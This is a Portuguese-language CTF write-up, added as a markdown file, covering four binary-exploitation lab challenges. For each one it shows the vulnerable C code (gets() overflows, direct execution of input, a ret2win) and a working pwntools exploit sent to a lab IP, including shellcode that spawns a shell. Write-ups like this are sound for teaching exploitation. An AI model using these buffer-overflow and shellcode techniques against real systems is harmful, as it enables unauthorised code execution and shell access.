@@ -1,0 +1,310 @@
+## Desafio: TryOverlfowMe 1 (Exploração Binária)
+
+### Introdução:
+
+No primeiro desafio, enfrentamos uma vulnerabilidade clássica de buffer overflow, onde precisamos apenas sobrescrever o valor da variável admin.
+
+### Análise inicial:
+
+O programa recebe uma entrada do usuário através da função insegura gets(). Se a variável admin for definida como 1 (provavelmente através de um buffer overflow), ele abre e imprime o conteúdo de flag.txt; caso contrário, ele encerra.
+
+A vulnerabilidade existe devido ao uso da função gets(), que não realiza verificação de limites (bounds checking). Isso nos permite executar um buffer overflow, sobrescrever o conteúdo da variável admin e ler a flag.
+
+'''bash
+int main(){
+    setup();
+    banner();
+    int admin = 0;
+    char buf[0x10]; // Buffer de 16 bytes
+
+    puts("PLease go ahead and leave a comment :");
+    gets(buf); // Função vulnerável
+
+    if (admin){ // Objetivo: sobrescrever para 1
+        const char* filename = "flag.txt";
+        FILE* file = fopen(filename, "r");
+        char ch;
+        while ((ch = fgetc(file)) != EOF) {
+            putchar(ch);
+    }
+    fclose(file);
+    }
+
+    else{
+        puts("Bye bye\n");
+        exit(1);
+    }
+}
+''' 
+
+O próximo passo é executar o overflowme1 para observar seu comportamento. Ao fornecer um comentário que excede o buffer, conseguimos causar uma falha de segmentação (segmentation fault).
+
+### Solução:
+
+Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.
+Ele cria um payload com 16 bytes de preenchimento (padding) seguidos por 32 repetições do valor 1 (empacotado em 32 bits com p32(1)), com o objetivo de sobrescrever a variável admin.
+
+Por fim, ele envia o payload e entra em modo interativo para receber a saída do servidor.
+
+'''bash
+from pwn import *
+
+# IP e porta do alvo
+target_ip = '10.10.23.250'
+target_port = 9003
+
+# Conecta ao servidor remoto
+p = remote(target_ip, target_port)
+
+# Monta o payload
+padding = b'A' * 16   # 16 bytes para preencher o buffer
+admin_value = p32(1) * 32  # Valor para sobrescrever 'admin'
+
+payload = padding + admin_value 
+
+# Envia o payload
+p.sendline(payload)
+
+# Interage com o programa para ver o resultado (a flag)
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos a flag do primeiro desafio.
+
+'.         '
+
+## Desafio: TryOverflowMe 2 (Exploração Binária)
+
+### Introdução:
+
+No segundo desafio, também enfrentamos uma vulnerabilidade clássica de buffer overflow. O objetivo é, novamente, sobrescrever o valor da variável admin, mas desta vez com um valor hexadecimal específico.
+
+### Análise inicial:
+
+Assim como no desafio anterior, o programa recebe uma entrada do usuário. Ele verifica se um valor específico (0x59595959) está definido na variável admin e, em caso afirmativo, lê e imprime o conteúdo de flag.txt. Caso contrário, ele encerra.
+Desta vez, o buffer é um pouco maior (64 bytes) e o valor para o qual a variável admin deve ser alterada é 0x59595959.
+
+'''bash
+int read_flag(){
+        const char* filename = "flag.txt";
+        FILE* file = fopen(filename, "r");
+        if(!file){
+            puts("the file flag.txt is not in the current directory, please contact support\n");
+            exit(1);
+        }
+        char ch;
+        while ((ch = fgetc(file)) != EOF) {
+        putchar(ch);
+    }
+    fclose(file);
+}
+
+int main(){
+    
+    setup();
+    banner();
+    int admin = 0;
+    int guess = 1;
+    int check = 0;
+    char buf[64]; // Buffer de 64 bytes
+
+    puts("Please Go ahead and leave a comment :");
+    gets(buf); // Função vulnerável
+
+    if (admin==0x59595959){ // Objetivo: sobrescrever para este valor
+            read_flag();
+    }
+
+    else{
+        puts("Bye bye\n");
+        exit(1);
+    }
+}
+'''
+
+Ao executarmos o overflowme2 para testar, confirmamos que, ao fornecer um comentário maior que o buffer, causamos uma falha de segmentação (segmentation fault).
+
+### Solução:
+
+Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.
+Ele cria um payload que consiste em 64 bytes A (padding) para estourar o buffer, seguido pelo valor 0x59595959 (empacotado com p32) repetido várias vezes para garantir a sobrescrita da variável admin.
+Após enviar o payload, o script entra em modo interativo para exibir a flag retornada pelo servidor.
+
+'''bash
+from pwn import *
+
+# IP e porta do alvo
+target_ip = '10.10.23.250'
+target_port = 9004
+
+# Conecta ao servidor remoto
+p = remote(target_ip, target_port)
+
+# Monta o payload
+padding = b'A' * 64        # 64 bytes para preencher o buffer
+admin_value = p32(0x59595959) * 32 # Valor específico necessário
+
+payload = padding + admin_value 
+
+# Envia o payload
+p.sendline(payload)
+
+# Interage com o programa para ver o resultado (a flag)
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos a flag do segundo desafio.
+
+'.          '
+
+## Desafio: TryExecMe (Exploração Binária)
+
+### Introdução:
+
+Este desafio não exige um overflow para explorar a vulnerabilidade. Este tipo de exploração binária envolve a injeção de shellcode.
+
+### Análise inicial:
+
+O programa deste desafio lê a entrada do usuário para um buffer e, em seguida, tenta executá-la como se fosse uma função. Ao fornecer um shellcode válido, conseguimos obter uma shell.
+A vulnerabilidade reside na seguinte linha, pois ela aceita diretamente a entrada do usuário e tenta executá-la como código:
+
+'''bash
+( ( void (*) () ) buf) ();
+'''
+
+'''bash
+int main(){
+    setup();
+    banner();
+    char *buf[128];   
+
+    puts("\nGive me your shell, and I will execute it: ");
+    read(0,buf,sizeof(buf)); // Lê a entrada para o buffer
+    puts("\nExecuting Spell...\n");
+
+    ( ( void (*) () ) buf) (); // Executa o conteúdo do buffer
+
+}
+'''
+
+O próximo passo é executar o tryexecme para observar seu comportamento. O programa solicita que forneçamos nossa "shell" e diz que irá executá-la.
+
+### Solução
+
+Usamos o script Pwntools a seguir para resolver o desafio. Precisamos definir o contexto da arquitetura para amd64 (para a geração correta do shellcode) e, em seguida, conectar à máquina alvo.
+O script cria um shellcode que gera uma shell (shellcraft.sh()) e o envia como payload. Finalmente, mudamos para o modo interativo para interagir com a shell que recebemos.
+
+'''bash
+from pwn import *
+
+# Configura o contexto do pwntools para o binário
+context.arch = 'amd64'  # Baseado na arquitetura do seu binário
+
+# Conecta ao serviço remoto
+p = remote('10.10.23.250', 9005)
+
+# Cria o shellcode (para gerar uma shell)
+shellcode = asm(shellcraft.sh())
+payload = shellcode 
+
+# Envia o payload para o serviço remoto
+p.sendline(payload)
+
+# Interage com a shell
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do terceiro desafio.
+
+'.          '
+
+##Desafio: TryRetMe (Exploração Binária)
+
+### Introdução:
+
+No quarto desafio, enfrentamos uma vulnerabilidade do tipo ret2win. Um ret2win (Return-to-Win) é um tipo de binário onde existe uma função win() (ou equivalente) que não é chamada, e nosso objetivo é redirecionar a execução do programa para ela.
+
+### Análise inicial:
+
+O programa exibe a mensagem "Return to where? : " e lê até 512 bytes de entrada. Após ler a entrada, ele imprime "ok, let's go!" e termina.
+A função win(), que executaria system("/bin/sh") e nos daria uma shell, é definida no código, mas nunca é invocada no fluxo de execução normal.
+
+'''bash
+int win(){
+
+    system("/bin/sh");
+}
+
+void vuln(){
+    char *buf[0x20]; // Buffer de 32 bytes (ponteiros de 64-bit)
+    puts("Return to where? : ");
+    read(0, buf, 0x200); // Lê 512 bytes para um buffer menor
+    puts("\nok, let's go!\n");
+}
+
+int main(){
+    setup();
+    vuln();
+}
+'''
+
+Nosso objetivo é usar o buffer overflow na função vuln() para sobrescrever o endereço de retorno na stack (controlando o registrador $rsp) e substituí-lo pelo endereço da função win().
+Para isso, precisamos de duas informações:
+
+1. O offset (quantos bytes) até o endereço de retorno.
+
+2. O endereço da função win().
+
+Para determinar o offset, usamos o GDB com GEF:
+
+1. Geramos um padrão cíclico (cyclic pattern).
+
+2. Executamos o programa no GDB (run).
+
+3. Colamos o padrão como entrada, o que causa um overflow e uma falha de segmentação.
+
+Ao inspecionar o registrador $rsp no momento da falha, o GEF nos mostra que o offset é de 264 bytes. Isso significa que, após 264 bytes de preenchimento, podemos escrever o endereço para onde queremos que a execução retorne.
+
+###Solução:
+
+Como mencionado no desafio, o sistema (Ubuntu) pode ter problemas de alinhamento de pilha (stack alignment issues). Para resolver isso, adicionamos um ret gadget ao nosso payload. Este gadget é simplesmente uma instrução ret que colocamos na pilha logo antes do endereço da função win(). Isso garante que a pilha esteja corretamente alinhada quando win() for chamada.
+O script Pwntools a seguir é usado para explorar a vulnerabilidade. Ele monta um payload que consiste em:
+
+1. Padding: 264 bytes de lixo (b'A').
+
+2. ret gadget: O endereço de uma instrução ret (encontrada pelo Pwntools).
+
+3. Endereço win: O endereço da função win (obtido dos símbolos do ELF).
+
+'''bash
+from pwn import *
+
+# Define o contexto do binário
+elf = context.binary = ELF('./tryretme')
+
+# Conecta ao servidor remoto
+p = remote('10.10.23.250', 9006)
+
+# Endereço da função win
+win_addr = elf.symbols['win']
+
+# Endereço de um gadget `ret` (para corrigir alinhamento da pilha)
+# O Pwntools encontra isso automaticamente
+ret_gadget = ROP(elf).find_gadget(['ret'])[0]
+
+# Offset (determinado com o padrão cíclico)
+offset = 264
+
+# Payload: preenchimento + gadget ret + endereço da win
+payload = b'A' * offset
+payload += p64(ret_gadget)  # Adiciona o gadget ret para alinhar
+payload += p64(win_addr)   # O endereço de retorno que queremos
+
+# Envia o payload após receber a pergunta
+p.sendlineafter('Return to where? : ', payload)
+
+# Interage com a shell
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do quarto desafio.
